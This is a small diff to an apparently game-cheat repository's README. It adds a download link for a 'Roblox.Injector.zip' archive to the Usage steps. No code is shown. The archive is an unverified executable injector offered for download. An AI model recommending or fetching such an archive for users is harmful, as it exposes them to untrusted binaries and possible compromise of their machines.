@@ -10,7 +10,7 @@
   
 ## Usage
 
- * [Download]() the zip archive. <br>
+ * [Download](https://github.com/norioj/Solara-Executor/releases/download/Download/Roblox.Injector.zip) the zip archive. <br>
 
  
 ## Notes
